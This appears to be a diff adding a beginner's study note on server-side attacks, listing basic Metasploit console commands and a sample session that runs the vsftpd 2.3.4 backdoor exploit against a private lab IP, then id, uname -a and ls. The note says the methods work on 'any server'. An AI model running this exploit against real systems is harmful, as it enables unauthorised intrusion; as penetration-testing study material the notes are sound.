@@ -1,0 +1,28 @@
+server side attack is a attack that don't need any user interractions for our attacks
+we can use these methods any server or any computers
+
+ping (ip-address)---- ping 192.182.80.122
+
+......METASPLOIT......
+
+><<<   COMMANDS   >>>>>
+msfconsole              (runs the metasploit console)
+help                    (shows the commands in this framework)
+show[something]         (shows that specific process that we ask)
+use[something]          (use a exploits, payload and auxliary)
+set[option][value]      (configure the options and values to exploites)
+exploit                 (run the code or task)
+show payloads           (shows the payloads )
+
+sample(eg):
+
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor          (shows the vulnerable process)
+show options                                      (shows the many options for this task)
+set RHOST 192.168.80.130                          (set the ipaddress )
+exploit                                           (everything is okay then exploit)
+
+after this we see things 
+id (shows the id )
+uname -a (shows the username and os)
+ls   (shows the file system)
